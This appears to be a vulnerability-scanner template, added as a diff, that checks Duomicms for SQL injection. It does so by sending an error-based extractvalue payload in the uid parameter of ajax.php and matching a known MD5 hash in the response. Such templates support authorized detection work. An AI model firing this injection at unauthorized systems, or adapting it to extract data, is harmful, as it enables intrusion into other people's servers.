@@ -1,0 +1,18 @@
+id: poc-yaml-duomicms-sqli
+info:
+  name: Duomicms SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in the Duomicms application.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(2000000005)))"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "fc9bdfb86bae5c322bae5acd78760935"
